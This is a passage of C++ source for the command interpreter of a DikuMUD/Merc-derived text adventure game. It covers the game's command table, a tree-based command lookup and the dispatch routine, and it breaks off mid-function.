/***************************************************************************
 *  file: interp.c , Command interpreter module.      Part of DIKUMUD      *
 *  Usage: Procedures interpreting user command                            *
 *  Copyright (C) 1990, 1991 - see 'license.doc' for complete information. *
 *                                                                         *
 *  Copyright (C) 1992, 1993 Michael Chastain, Michael Quan, Mitchell Tse  *
 *  Performance optimization and bug fixes by MERC Industries.             *
 *  You can use our stuff in any way you like whatsoever so long as ths   *
 *  copyright notice remains intact.  If you like it please drop a line    *
 *  to mec\@garnet.berkeley.edu.                                            *
 *                                                                         *
 *  This is free software and you are benefitting.  We hope that you       *
 *  share your changes too.  What goes around, comes around.               *
 ***************************************************************************/
/* $Id: interp.cpp,v 1.1 2002/06/13 04:32:18 dcastle Exp $ */

extern "C"
{
#include <stdlib.h>
#include <string.h>
#include <ctype.h>
#include <stdio.h>
/*#include <memory.h>*/
}
#ifdef LEAK_CHECK
#include <dmalloc.h>
#endif

#include <structs.h> // MAX_STRING_LENGTH
#include <character.h> // POSITION_*
#include <interp.h>
#include <levels.h>
#include <utility.h>
#include <player.h>
#include <fight.h>
#include <mobile.h>
#include <connect.h> // descriptor_data
#include <room.h>
#include <db.h>
#include <act.h>
#include <returnvals.h>

extern bool check_social( CHAR_DATA *ch, char *pcomm,
    int length, char *arg );

extern struct index_data *mob_index;
extern struct index_data *obj_index;
extern CWorld world;

// globals to store last command that was done.
// this is used for debugging.  We output it in case of a crash
// to the log files.  (char name is so long, in case it was a mob)
char last_processed_cmd[MAX_INPUT_LENGTH];
char last_char_name[MAX_INPUT_LENGTH];

void update_wizlist(CHAR_DATA *ch);
// int system(const char *); 

void add_command_to_radix(struct command_info *cmd);

// The command number should be 9 for any user command that is not used 
// in a spec_proc.  If it is, then it should be a number that is not
// already in use.
struct command_info cmd_info[] =
{
    /*
     * Common movement commands.
     */
    { "north",      do_move,        POSITION_STANDING,  0,  1 },
    { "east",       do_move,        POSITION_STANDING,  0,  2 },
    { "south",      do_move,        POSITION_STANDING,  0,  3 },
    { "west",       do_move,        POSITION_STANDING,  0,  4 },
    { "up",         do_move,        POSITION_STANDING,  0,  5 },
    { "down",       do_move,        POSITION_STANDING,  0,  6 },

    /*
     * Common other commands.
     * Placed here so one and two letter abbreviations work.
     */
    { "faddle",     do_spam,        POSITION_DEAD,      0,  9 },
    { "cast",       do_cast,        POSITION_SITTING,   0,  9 },
    { "sing",       do_sing,        POSITION_RESTING,   0,  9 },
    { "exits",      do_exits,       POSITION_RESTING,   0,  9 },
    { "f",          do_fire,        POSITION_FIGHTING,  1,  9 },
    { "get",        do_get,         POSITION_RESTING,   0,  9 },
    { "inventory",  do_inventory,   POSITION_DEAD,      0,  9 },
    { "k",          do_kill,        POSITION_FIGHTING,  0,  9 },
    { "ki",	    do_ki,          POSITION_SITTING,   0, 9 },
    { "kill",       do_kill,        POSITION_FIGHTING,  0,  9 },
    { "look",       do_look,        POSITION_RESTING,   0,  12 },
    { "glance",     do_look,        POSITION_RESTING,   0,  20 },
    { "order",      do_order,       POSITION_RESTING,   0,  9 },
    { "rest",       do_rest,        POSITION_RESTING,   0,  9 },
    { "recite",     do_recite,      POSITION_RESTING,   0,  9 },
    { "recall",     do_recall,      POSITION_RESTING,   0,  9 },
    { "score",      do_score,       POSITION_DEAD,      0,  9 },
    { "scan",       do_scan,        POSITION_RESTING,   1,  9 },
    { "stand",      do_stand,       POSITION_RESTING,   0,  9 },
    { "switch",     do_switch,      POSITION_RESTING,   0,  9 },
    { "tell",       do_tell,        POSITION_RESTING,   0,  9 },
    { "wield",      do_wield,       POSITION_RESTING,   0,  9 },
    /*
     * Informational commands.
     */
    { "alias",      do_alias,       POSITION_DEAD,      0,  9 },
    { "toggle",     do_toggle,      POSITION_DEAD,      0,  9 },
/*    { "bug",        do_bug,         POSITION_DEAD,      0,  9 }, moved to end */
    { "credits",    do_credits,     POSITION_DEAD,      0,  9 },
    { "equipment",  do_equipment,   POSITION_DEAD,      0,  9 },
    { "help",       do_help,        POSITION_DEAD,      0,  9 },
    { "idea",       do_idea,        POSITION_DEAD,      0,  9 },
    { "info",       do_info,        POSITION_DEAD,      0,  9 },
    { "news",       do_news,        POSITION_DEAD,      0,  9 },
    { "story",      do_story,       POSITION_DEAD,      0,  9 },
    { "tick",       do_tick,        POSITION_DEAD,      0,  9 },
    { "time",       do_time,        POSITION_DEAD,      0,  9 },
    { "title",      do_title,       POSITION_DEAD,      0,  9 },
    { "typo",       do_typo,        POSITION_DEAD,      0,  9 },
    { "weather",    do_weather,     POSITION_DEAD,      0,  9 },
    { "who",        do_who,         POSITION_DEAD,      0,  9 },
    { "wizlist",    do_wizlist,     POSITION_DEAD,      0,  9 },
    { "social",     do_social,      POSITION_DEAD,      0,  9 },

    /*
     * Communication commands.
     */
    { "ask",        do_ask,         POSITION_RESTING,   0,  9 },
    { "auction",    do_auction,     POSITION_RESTING,   0,  9 },
    { "channel",    do_channel,     POSITION_DEAD,      0,  9 },
    { "dream",      do_dream,       POSITION_DEAD,      0,  9 },
    { "emote",      do_emote,       POSITION_RESTING,   0,  9 },
    { ":",          do_emote,       POSITION_RESTING,   0,  9 },    
    { "gossip",     do_gossip,      POSITION_DEAD,      0,  9 },    
    { "newbie",     do_newbie,      POSITION_DEAD,      0,  9 },    
    { "trivia",	    do_trivia,	    POSITION_DEAD,      0,  9 },
    { "gtell",      do_grouptell,   POSITION_DEAD,      0,  9 },
    { ".",          do_grouptell,   POSITION_DEAD,      0,  9 },
    { "ignore",     do_ignore,      POSITION_DEAD,      0,  9 },
    { "insult",     do_insult,      POSITION_RESTING,   0,  9 },
    { "reply",      do_reply,       POSITION_RESTING,   0,  9 },
    { "report",     do_report,      POSITION_RESTING,   0,  9 },
    { "say",        do_say,         POSITION_RESTING,   0, 11 },
    { "'",          do_say,         POSITION_RESTING,   0, 11 },
    { "shout",      do_shout,       POSITION_RESTING,   0,  9 },
    { "whisper",    do_whisper,     POSITION_RESTING,   0,  9 },

    /*
     * Object manipulation commands.
     */
    { "slip",       do_slip,        POSITION_STANDING,  0,  9 },
    { "close",      do_close,       POSITION_RESTING,   0,  9 },
    { "donate",     do_donate,      POSITION_RESTING,   0,  9 },
    { "drink",      do_drink,       POSITION_RESTING,   0,  9 },
    { "drop",       do_drop,        POSITION_RESTING,   0,  9 },
    { "eat",        do_eat,         POSITION_RESTING,   0,  9 },
    { "fill",       do_fill,        POSITION_RESTING,   0,  9 },
    { "give",       do_give,        POSITION_RESTING,   0,  88 },
    { "grab",       do_grab,        POSITION_RESTING,   0,  9 },
    { "hold",       do_grab,        POSITION_RESTING,   0,  9 },
    { "lock",       do_lock,        POSITION_RESTING,   0,  9 },
    { "open",       do_open,        POSITION_RESTING,   0,  9 },
    { "pour",       do_pour,        POSITION_RESTING,   0,  9 },
    { "put",        do_put,         POSITION_RESTING,   0,  9 },
    { "quaff",      do_quaff,       POSITION_RESTING,   0,  9 },
    { "read",       do_read,        POSITION_RESTING,   0,  67 },
    { "remove",     do_remove,      POSITION_RESTING,   0,  69 },
    { "erase",      do_not_here,    POSITION_RESTING,   0,  70 },
    { "sip",        do_sip,         POSITION_RESTING,   0,  9 },
    { "track",      do_track,       POSITION_STANDING,  0,  10 },
    { "take",       do_get,         POSITION_RESTING,   0,  9 },
    { "palm",       do_get,         POSITION_RESTING,   3,  10 },
    { "junk",       do_tap,         POSITION_RESTING,   0,  9 },
    { "sacrifice",  do_tap,         POSITION_RESTING,   0,  9 },
    { "taste",      do_taste,       POSITION_RESTING,   0,  9 },
    { "unlock",     do_unlock,      POSITION_RESTING,   0,  9 },
    { "use",        do_use,         POSITION_RESTING,   0,  9 },
    { "wear",       do_wear,        POSITION_RESTING,   0,  9 },
    { "meta",       do_not_here,    POSITION_RESTING,   0,  80 },

    /*
     * Combat commands.
     */
    { "bash",       do_bash,        POSITION_FIGHTING,  0,  9 },
    { "retreat",    do_retreat,     POSITION_FIGHTING,  0,  9 },
    { "disarm",     do_disarm,      POSITION_FIGHTING,  2,  9 },
    { "flee",       do_flee,        POSITION_FIGHTING,  0,  9 }, 
    { "hit",        do_hit,         POSITION_FIGHTING,  0,  9 },
    { "join",       do_join,        POSITION_FIGHTING,  0,  9 },
    { "murder",     do_murder,      POSITION_FIGHTING,  5,  9 },
    { "rescue",     do_rescue,      POSITION_FIGHTING,  0,  9 },
    { "trip",       do_trip,        POSITION_FIGHTING,  0,  9 },
    { "deathstroke",do_deathstroke, POSITION_FIGHTING, 30,  9 },
    { "circle",     do_circle,      POSITION_FIGHTING, 30,  9 },
    { "kick",       do_kick,        POSITION_FIGHTING,  0,  9 },
    { "battlecry",  do_battlecry,   POSITION_FIGHTING,  1,  9 },
    { "rage",       do_rage,        POSITION_FIGHTING,  1,  9 },
    { "berserk",    do_berserk,     POSITION_FIGHTING,  1,  9 },
    { "stun",       do_stun,        POSITION_FIGHTING, 30,  9 },
    { "redirect",   do_redirect,    POSITION_FIGHTING,  1,  9 },
    { "hitall",     do_hitall,      POSITION_FIGHTING, 20,  9 },
 { "quiveringpalm", do_quivering_palm, POSITION_FIGHTING, 40,  9},
    { "eagleclaw",  do_eagle_claw,  POSITION_FIGHTING, 20,  9 },
    { "headbutt",   do_headbutt,    POSITION_FIGHTING, 15,  9 },
    { "fire",       do_fire,        POSITION_FIGHTING, 1,  9 },
    { "layhands",   do_layhands,    POSITION_FIGHTING, 1, 9 },
    { "harmtouch",  do_harmtouch,   POSITION_FIGHTING, 1, 9 },
    { "bloodfury",  do_bloodfury,   POSITION_FIGHTING, 1, 9 },
    { "bladeshield",do_bladeshield, POSITION_FIGHTING, 1, 9 },
    { "repelance",  do_focused_repelance, POSITION_FIGHTING, 1, 9 },
    { "vitalstrike", do_vitalstrike, POSITION_FIGHTING, 1, 9 },

    /*
     * Position commands.
     */
    { "sit",        do_sit,         POSITION_RESTING,   0,  9 },
    { "sleep",      do_sleep,       POSITION_SLEEPING,  0,  9 },
    { "wake",       do_wake,        POSITION_SLEEPING,  0,  9 },

    /*
     * Miscellaneous commands.
     */
    { "ctell",      do_ctell,       POSITION_SLEEPING,  0,  9 },
    { "outcast",    do_outcast,     POSITION_RESTING,   0,  9 },
    { "accept",     do_accept,      POSITION_RESTING,   0,  9 },
    { "whoclan",    do_whoclan,     POSITION_DEAD,      0,  9 },
    { "cpromote",   do_cpromote,    POSITION_RESTING,   0,  9 },
    { "clans",      do_clans,       POSITION_SLEEPING,  0,  9 },
    { "cinfo",      do_cinfo,       POSITION_SLEEPING,  0,  9 },
    { "ambush",     do_ambush,      POSITION_RESTING,   0,  9 },
    { "whoarena",   do_whoarena,    POSITION_SLEEPING,  0,  9 },
    { "joinarena",  do_joinarena,   POSITION_STANDING,  0,  9 },
    { "backstab",   do_backstab,    POSITION_STANDING,  0,  9 },
    { "bs",         do_backstab,    POSITION_STANDING,  0,  9 },
    { "boss",       do_boss,        POSITION_DEAD,      0,  9 },
    { "consider",   do_consider,    POSITION_RESTING,   0,  9 },
    { "enter",      do_enter,       POSITION_STANDING,  0,  60 },
    { "climb",      do_climb,       POSITION_STANDING,  0,  60 },
    { "examine",    do_examine,     POSITION_RESTING,   0,  9 },
    { "follow",     do_follow,      POSITION_RESTING,   0,  9 },
    { "stalk",      do_stalk,       POSITION_STANDING,  10, 9 },
    { "group",      do_group,       POSITION_SLEEPING,  0,  9 },
    { "found",      do_found,       POSITION_RESTING,   0,  9 },
    { "disband",    do_disband,     POSITION_RESTING,   0,  9 },
    { "abandon",    do_abandon,     POSITION_RESTING,   0,  9 },
    { "consent",    do_consent,     POSITION_RESTING,   0,  9 },
    { "whogroup",   do_whogroup,    POSITION_SLEEPING,  0,  9 },
    { "forage",     do_forage,      POSITION_STANDING,  0,  9 },
    { "whosolo",    do_whosolo,     POSITION_SLEEPING,  0,  9 },
    { "count",      do_count,       POSITION_SLEEPING,  0,  9 },
    { "hide",       do_hide,        POSITION_RESTING,   0,  9 },
    { "leave",      do_leave,       POSITION_STANDING,  0,  187 },
    { "name",       do_name,        POSITION_DEAD,      5,  9 },
    { "pick",       do_pick,        POSITION_STANDING,  0,  35 },
    { "qui",        do_qui,         POSITION_DEAD,      0,  9 },
    { "levels",     do_levels,      POSITION_DEAD,      0,  9 },
    { "quit",       do_quit,        POSITION_DEAD,      0,  9 },
    { "return",     do_return,      POSITION_DEAD,      0,  9 },
    { "tame",       do_tame,        POSITION_RESTING,   0,  9 },
    { "prompt",     do_prompt,      POSITION_DEAD,      0,  9 },
    { "save",       do_save,        POSITION_DEAD,      0,  9 },
    { "sneak",      do_sneak,       POSITION_STANDING,  1,  9 },
    { "home",       do_home,        POSITION_DEAD,      0,  9 },
    { "split",      do_split,       POSITION_RESTING,   0,  9 },
    { "spells",     do_spells,      POSITION_SLEEPING,  0,  9 },
    { "steal",      do_steal,       POSITION_STANDING,  1,  9 },
    { "motd",       do_motd,        POSITION_DEAD,      0,  9 },
    { "where",      do_where,       POSITION_RESTING,   0,  9 },
    { "write",      do_write,       POSITION_STANDING,  0,  128 },
    { "beacon",     do_beacon,      POSITION_RESTING,   0,  9 },
    { "leak",       do_memoryleak,  POSITION_RESTING,   0,  9 },
    { "beep",       do_beep,        POSITION_DEAD,      0,  9 },
    { "guard",      do_guard,       POSITION_RESTING,   0,  9 },

    /*
     * Special procedure commands.
     */
    { "design",     do_not_here,    POSITION_STANDING,  0,  62 },
    { "stock",      do_not_here,    POSITION_STANDING,  0,  61 },
    { "buy",        do_not_here,    POSITION_STANDING,  0,  56 },
    { "sell",       do_not_here,    POSITION_STANDING,  0,  57 },
    { "value",      do_not_here,    POSITION_STANDING,  0,  58 },
    { "list",       do_not_here,    POSITION_STANDING,  0,  59 },
    { "repair",     do_not_here,    POSITION_STANDING,  0,  66 },
    { "practice",   do_practice,    POSITION_RESTING,   1,  164 },
    { "practise",   do_practice,    POSITION_RESTING,   1,  164 },
    { "pray",       do_pray,        POSITION_RESTING,   0,  9   },
    { "promote",    do_promote,     POSITION_STANDING,  1,  9   },
    { "price",      do_not_here,    POSITION_RESTING,   1,  65  },
    { "train",      do_not_here,    POSITION_RESTING,   1,  165 },
    { "gain",       do_not_here,    POSITION_STANDING,  1,  171 },
    { "balance",    do_not_here,    POSITION_STANDING,  0,  172 },
    { "deposit",    do_not_here,    POSITION_STANDING,  0,  173 },
    { "withdraw",   do_not_here,    POSITION_STANDING,  0,  174 },
    { "clean",      do_not_here,    POSITION_RESTING, 0, 177 },
    { "play",       do_not_here,    POSITION_RESTING, 0, 178 },
    { "finish",     do_not_here,    POSITION_RESTING, 0, 179 },
    { "veternarian", do_not_here,   POSITION_RESTING, 0, 180 },
    { "feed",       do_not_here,    POSITION_RESTING, 0, 181 },
    { "assemble",   do_not_here,    POSITION_RESTING, 0, 182 },
    { "pay",        do_not_here,    POSITION_STANDING, 0, 183 },
    { "restring",   do_not_here,    POSITION_STANDING, 0, 184 },
    { "push",       do_not_here,    POSITION_STANDING, 0, 185 },
    { "pull",       do_not_here,    POSITION_STANDING, 0, 186 },
    
    /*
     * Immortal commands.
     */
    { "thunder",    do_thunder,      POSITION_DEAD,      IMP, 9 },
    { "wizlock",    do_wizlock,      POSITION_DEAD,      IMP, 9 },
    { "processes",  do_processes,    POSITION_DEAD,      IMP, 9 },
    { "bestow",     do_bestow,       POSITION_DEAD,      IMP, 9 },
    { "revoke",     do_revoke,       POSITION_DEAD,      IMP, 9 },
    { "chpwd",      do_chpwd,        POSITION_DEAD,      IMP, 9 },
    { "motdload",   do_motdload,     POSITION_DEAD,      IMP, 9 },
    { "advance",    do_advance,      POSITION_DEAD,      IMP, 9 },

    { "linkload",   do_linkload,     POSITION_DEAD,      OVERSEER, 9 },
    { "sedit",      do_sedit,        POSITION_DEAD,      OVERSEER, 9 },
    { "zap",        do_zap,          POSITION_DEAD,      OVERSEER, 9 },
    { "slay",       do_kill,         POSITION_DEAD,      OVERSEER, 9 },
    { "rename",     do_rename_char,  POSITION_DEAD,      OVERSEER, 9 },
    { "archive",    do_archive,      POSITION_DEAD,      OVERSEER, 9 },
    { "unarchive",  do_unarchive,    POSITION_DEAD,      OVERSEER, 9 },
    { "stealth",    do_stealth,      POSITION_DEAD,      OVERSEER, 9 },
    { "sockets",    do_sockets,      POSITION_DEAD,      OVERSEER, 9 },
    { "disconnect", do_disconnect,   POSITION_DEAD,      OVERSEER, 9 },  
    { "force",      do_force,        POSITION_DEAD,      OVERSEER, 9 },
    { "pardon",     do_pardon,       POSITION_DEAD,      OVERSEER, 9 },
    { "punish",     do_punish,       POSITION_DEAD,      OVERSEER, 9 },
 
    { "goto",       do_goto,         POSITION_DEAD,      GIFTED_COMMAND, 9 },
    { "restore",    do_restore,      POSITION_DEAD,      GIFTED_COMMAND, 9 },
    { "purloin",    do_purloin,      POSITION_DEAD,      GIFTED_COMMAND, 9 },
    { "set",        do_set,          POSITION_DEAD,      GIFTED_COMMAND, 9 },
    { "unban",      do_unban,        POSITION_DEAD,      GIFTED_COMMAND, 9 },
    { "ban",        do_ban,          POSITION_DEAD,      GIFTED_COMMAND, 9 },
    { "echo",       do_echo,         POSITION_DEAD,      GIFTED_COMMAND, 9 },
    { "send",       do_send,         POSITION_DEAD,      GIFTED_COMMAND, 9 },
    { "at",         do_at,           POSITION_DEAD,      GIFTED_COMMAND, 9 }, 
    { "fakelog",    do_fakelog,      POSITION_DEAD,      GIFTED_COMMAND, 9 },
    { "global",     do_global,       POSITION_DEAD,      GIFTED_COMMAND, 9 },
    { "log",        do_log,          POSITION_DEAD,      GIFTED_COMMAND, 9 },
    { "snoop",      do_snoop,        POSITION_DEAD,      GIFTED_COMMAND, 9 },
    { "pview",      do_pview,        POSITION_DEAD,      GIFTED_COMMAND, 9 },
    { "/",          do_wiz,          POSITION_DEAD,      GIFTED_COMMAND, 8 },
    { "arena",      do_arena,        POSITION_DEAD,      GIFTED_COMMAND, 9 },
    { "load",       do_load,         POSITION_DEAD,      GIFTED_COMMAND, 9 },
    { "shutdow",    do_shutdow,      POSITION_DEAD,      GIFTED_COMMAND, 9 },
    { "shutdown",   do_shutdown,     POSITION_DEAD,      GIFTED_COMMAND, 9 },
    { "mpedit",     do_mpedit,       POSITION_DEAD,      GIFTED_COMMAND, 9 },
    { "mpstat",     do_mpstat,       POSITION_DEAD,      GIFTED_COMMAND, 9 },
    { "range",      do_range,        POSITION_DEAD,      GIFTED_COMMAND, 9 },
    { "pshopedit",  do_pshopedit,    POSITION_DEAD,      GIFTED_COMMAND, 9 },

    { "bellow",     do_thunder,      POSITION_DEAD,      DEITY, 8 },
    { "plats",      do_plats,        POSITION_DEAD,      DEITY, 9 },
    { "string",     do_string,       POSITION_DEAD,      DEITY, 9 },
    { "transfer",   do_trans,        POSITION_DEAD,      DEITY, 9 },
    { "gtrans",     do_gtrans,       POSITION_DEAD,      DEITY, 9 },
    { "boot",       do_boot,         POSITION_DEAD,      DEITY, 9 },
    { "linkdead",   do_linkdead,     POSITION_DEAD,      DEITY, 9 },
    { "teleport",   do_teleport,     POSITION_DEAD,      DEITY, 9 },
    { "purge",      do_purge,        POSITION_DEAD,      DEITY, 9 },

    { "boro",       do_boro,         POSITION_DEAD,      ANGEL, 9 },
    { "show",       do_show,         POSITION_DEAD,      ANGEL, 9 },
    { "fighting",   do_fighting,     POSITION_DEAD,      ANGEL, 9 },
    { "peace",      do_peace,        POSITION_DEAD,      ANGEL, 9 },
    { "check",      do_check,        POSITION_DEAD,      ANGEL, 9 },
    { "find",       do_find,         POSITION_DEAD,      ANGEL, 9 },
    { "stat",       do_stat,         POSITION_DEAD,      ANGEL, 9 },
    { "redit",      do_redit,        POSITION_DEAD,      ANGEL, 9 },
    { "oedit",      do_oedit,        POSITION_DEAD,      ANGEL, 9 },
    { "clear",	    do_clear,	     POSITION_DEAD,	 ANGEL, 9 },
    { "repop",	    do_repop,	     POSITION_DEAD,	 ANGEL, 9 },
    { "medit",      do_medit,        POSITION_DEAD,      ANGEL, 9 },
    { "rdelete",    do_rdelete,      POSITION_DEAD,      ANGEL, 9 },
    { "oneway",     do_oneway,       POSITION_DEAD,      ANGEL, 1 },
    { "twoway",     do_oneway,       POSITION_DEAD,      ANGEL, 2 },
//    { "rload",      do_rload,        POSITION_DEAD,      ANGEL, 9 },
    { "zsave",      do_zsave,        POSITION_DEAD,      ANGEL, 9 },
    { "rsave",      do_rsave,        POSITION_DEAD,      ANGEL, 9 },
    { "msave",      do_msave,        POSITION_DEAD,      ANGEL, 9 },
    { "osave",      do_osave,        POSITION_DEAD,      ANGEL, 9 },
    { "instazone",  do_instazone,    POSITION_DEAD,      ANGEL, 9 },
    { "rstat",      do_rstat,        POSITION_DEAD,      ANGEL, 9 },
    { "possess",    do_possess,      POSITION_DEAD,      ANGEL, 9 },
    { "fsave",      do_fsave,        POSITION_DEAD,      ANGEL, 9 },
    { "zedit",      do_zedit,        POSITION_DEAD,      ANGEL, 9 },
    { "colors",     do_colors,       POSITION_DEAD,      ANGEL, 9 },

    { "incognito",  do_incognito,    POSITION_DEAD,      IMMORTAL, 9 },
    { "high5",      do_highfive,     POSITION_DEAD,      IMMORTAL, 9 },
    { "holylite",   do_holylite,     POSITION_DEAD,      IMMORTAL, 9 },
    { "immort",     do_wiz,          POSITION_DEAD,      IMMORTAL, 9 },
    { ";",          do_wiz,          POSITION_DEAD,      IMMORTAL, 9 },
    { "nohassle",   do_nohassle,     POSITION_DEAD,      IMMORTAL, 9 },
    { "wizinvis",   do_wizinvis,     POSITION_DEAD,      IMMORTAL, 9 },
    { "poof",       do_poof,         POSITION_DEAD,      IMMORTAL, 9 },
    { "wizhelp",    do_wizhelp,      POSITION_DEAD,      IMMORTAL, 9 },
    { "imotd",      do_imotd,        POSITION_DEAD,      IMMORTAL,  9 },

/* spec proc commands placed so they don't effect god commands */
    { "setup",      do_mortal_set,  POSITION_STANDING,  0,  9 },

/*  bug placed here so it comes after "buy" */
    { "bug",        do_bug,         POSITION_DEAD,      0,  9 },

/* MOBprogram commands */
    { "mpasound",   do_mpasound,    POSITION_DEAD,      0,  9 },
    { "mpjunk",     do_mpjunk,      POSITION_DEAD,      0,  9 },
    { "mpecho",     do_mpecho,      POSITION_DEAD,      0,  9 },
    { "mpechoat",   do_mpechoat,    POSITION_DEAD,      0,  9 },
    { "mpechoaround", do_mpechoaround, POSITION_DEAD,   0,  9 },
    { "mpkill",     do_mpkill,      POSITION_DEAD,      0,  9 },
    { "mpmload",    do_mpmload,     POSITION_DEAD,      0,  9 },
    { "mpoload",    do_mpoload,     POSITION_DEAD,      0,  9 },
    { "mppurge",    do_mppurge,     POSITION_DEAD,      0,  9 },
    { "mpgoto",     do_mpgoto,      POSITION_DEAD,      0,  9 },
    { "mpat",       do_mpat,        POSITION_DEAD,      0,  9 },
    { "mptransfer", do_mptransfer,  POSITION_DEAD,      0,  9 },
    { "mpthrow",    do_mpthrow,     POSITION_DEAD,      0,  9 },
    { "mpforce",    do_mpforce,     POSITION_DEAD,      0,  9 },
    { "mpxpreward", do_mpxpreward,  POSITION_DEAD,      0,  9 },
    { "mpteachskill", do_mpteachskill, POSITION_DEAD,   0,  9 },

/* test commands */
    { "do_stromboli", do_stromboli, POSITION_DEAD, 0, 9 },

    /*
     * End of list.
     */
    { "",           do_not_here,    POSITION_DEAD,      0,  9 }
};



char *fill[]=
{
    "in", "from", "with", "the", "on", "at", "to", "\n"
};

struct cmd_hash_info
{
  struct command_info *command;
  struct cmd_hash_info *left;
  struct cmd_hash_info *right;
};

struct cmd_hash_info *cmd_radix;

void add_commands_to_radix(void)
{
  int x;

#ifdef LEAK_CHECK
  cmd_radix = (struct cmd_hash_info *)calloc(1, sizeof(struct cmd_hash_info));
#else
  cmd_radix = (struct cmd_hash_info *)dc_alloc(1, sizeof(struct cmd_hash_info));
#endif
  cmd_radix->command = &cmd_info[0];
  cmd_radix->left    = 0;
  cmd_radix->right   = 0;
  
  for(x = 1; (unsigned) x < (sizeof(cmd_info)/sizeof(cmd_info[0]) - 1); x++) 
    add_command_to_radix(&cmd_info[x]); 
}

void free_command_radix_nodes(struct cmd_hash_info * curr)
{
  if(curr->left)
    free_command_radix_nodes(curr->left);
  if(curr->right)
    free_command_radix_nodes(curr->right);
  dc_free(curr);
}

void add_command_to_radix(struct command_info *cmd)
{
  struct cmd_hash_info *curr;
  struct cmd_hash_info *temp;
  struct cmd_hash_info *next;
  int whichway;

  /*
   * At the end of ths loop, temp will contain the
   * parent of the new_new node.  Whether it is the left
   * or right node depends on whether whichway is
   * positive or negative.
   */
  for(curr = cmd_radix; curr; curr = next) {
    if((whichway =
       strcmp(cmd->command_name, curr->command->command_name)) < 0)
      next = curr->left;
    else
      next = curr->right;
    temp = curr; 
  }

#ifdef LEAK_CHECK
  curr = (struct cmd_hash_info *)calloc(1, sizeof(struct cmd_hash_info));
#else
  curr = (struct cmd_hash_info *)dc_alloc(1, sizeof(struct cmd_hash_info));
#endif
  curr->command = cmd;
  curr->left  = 0;
  curr->right = 0;
  if(whichway < 0)
    temp->left = curr;
  else
    temp->right = curr;
}

int len_cmp(char *s1, char *s2)
{
  for( ; *s1 && *s1 != ' '; s1++, s2++) 
    if(*s1 != *s2)
      return *s1 - *s2;

  return 0; 
}

struct command_info *find_cmd_in_radix(char *arg)
{
  struct cmd_hash_info *curr;
  struct cmd_hash_info *next;
  int whichway;

  for(curr = cmd_radix; curr; curr = next) {
    if((whichway = len_cmp(arg, curr->command->command_name)) == 0)
      return curr->command;
    if(whichway < 0)
      next = curr->left;
    else
      next = curr->right; 
  }

  return 0;
} 

int do_motd(CHAR_DATA *ch, char *arg, int cmd)
{
  extern char motd[];

  page_string(ch->desc, motd, 1);
  return eSUCCESS;
}

int do_imotd(CHAR_DATA *ch, char *arg, int cmd)
{
  extern char imotd[];

  page_string(ch->desc, imotd, 1);
  return eSUCCESS;
}


int command_interpreter( CHAR_DATA *ch, char *pcomm )
{
    int look_at;
    int retval;
    struct command_info *found = 0;

    // Handle logged players.
    if(!IS_NPC(ch) && IS_SET(ch->pcdata->punish, PUNISH_LOG)) {
      sprintf( log_buf, "Log %s: %s", GET_NAME(ch), pcomm );
      log( log_buf, IMP, LOG_PLAYER );
    }

    // Implement freeze command.
    if(!IS_NPC(ch) && IS_SET(ch->pcdata->punish, PUNISH_FREEZE)) {
      send_to_char( "You're totally frozen!\n\r", ch );
      return eSUCCESS;
    }

    if (!IS_NPC(ch) && IS_SET(ch->combat, COMBAT_BERSERK)) {
       if (ch->fighting) {
          send_to_char("You've gone BERSERK! ALL you can do is KILL!\n\r", ch);
          return eSUCCESS;
       }
       REMOVE_BIT(ch->combat, COMBAT_BERSERK);
       act("$n settles down.", ch, 0, 0, TO_ROOM, 0);
       act("You settle down.", ch, 0, 0, TO_CHAR, 0);
       GET_AC(ch) -= 80;
    }

    if (IS_AFFECTED(ch, AFF_PARALYSIS)) {
       send_to_char("You're paralyzed, and can't move! \n\r", ch);
       return eSUCCESS;
    }

    // Strip initial spaces OR tab characters and parse command word.
    // Translate to lower case.  We need to translate tabs for the MOBProgs to work
    while ( *pcomm == ' ' || *pcomm == '\t')
	pcomm++;
    
    for ( look_at = 0; pcomm[look_at] > ' '; look_at++ )
	pcomm[look_at]  = LOWER(pcomm[look_at]);

    if ( look_at == 0 )
	return eFAILURE;

    // if we got this far, we're going to play with the command, so put
    // it into the debugging globals
    strncpy(last_processed_cmd, pcomm, (MAX_INPUT_LENGTH-1));    
    strncpy(last_char_name, GET_NAME(ch), (MAX_INPUT_LENGTH-1));    

    // Look for command in command table.

    // Old method used a linear search. *yuck* (Sadus)
    if((found = find_cmd_in_radix(pcomm))) 
       if(GET_LEVEL(ch) >= found->minimum_level &&
          found->command_pointer != NULL) 
       { 
  
      // Character not in position for command?
      if ( GET_POS(ch) < found->minimum_position )
      {
	  switch( GET_POS(ch) )
	  {
	  case POSITION_DEAD:
	      send_to_char( "Lie still; you are DEAD.\n\r", ch );
	      break;
	  case POSITION_STUNNED:
	      send_to_char( "You are too stunned to do that.\n\r", ch );
	      break;
	  case POSITION_SLEEPING:
	      send_to_char( "In your dreams, or what?\n\r", ch );
	      break;
	  case POSITION_RESTING:
	      send_to_char( "Nah... You feel too relaxed...\n\r", ch);
	      break;
	  case POSITION_SITTING:
	      send_to_char( "Maybe you should stand up first?\n\r", ch);
	      break;
	  case POSITION_FIGHTING:
	      send_to_char( "No way!  You are still fighting!\n\r", ch);
	      break;
	  }
	  return eSUCCESS;
      }

/*
// Last resort for debugging...if you know it's a mortal.
// -Sadus 
      char DEBUGbuf[MAX_STRING_LENGTH];
      sprintf(DEBUGbuf, "%s: %s", GET_NAME(ch), pcomm); 
      log (DEBUGbuf, 0, LOG_MISC);
*/
      /*
       * We're gonna execute it.
       * First look for usable special procedure.
       */
      retval = special( ch, found->command_number, &pcomm[look_at] );
      if(IS_SET(retval, eSUCCESS) || IS_SET(retval, eCH_DIED))
	  return retval;
        
      /*
       * Normal dispatch.
       */
      retval = (*(found->command_pointer))
	  (ch, &pcomm[look_at], found->command_number);
  
      /*
       * This call is here to prevent gcc from tail-chaining the
       * previous call, which screws up the debugger call stack.
       * -- Furey
       */
      number( 0, 0 );
      return retval;
   }
   /*
    * Look for command in socials table.
    */
    if(check_social( ch, pcomm, look_at, &pcomm[look_at]))
     return eSUCCESS;

   /* Still here?  Unknown command */

   /*
    * Unknown command (or char too low level).
    */
    send_to_char( "Huh?\n\r", ch );
    return eSUCCESS;
}



int search_block(char *arg, char **list, bool exact)
{
    int i,l;

    /* Make into lower case, and get length of string */
    for(l=0; *(arg+l); l++)
	*(arg+l)=LOWER(*(arg+l));

    if (exact) {
	for(i=0; **(list+i) != '\n'; i++)
	    if (!strcmp(arg, *(list+i)))
		return(i);
    } else {
	if (!l)
	    l=1; /* Avoid "" to match the first available string */
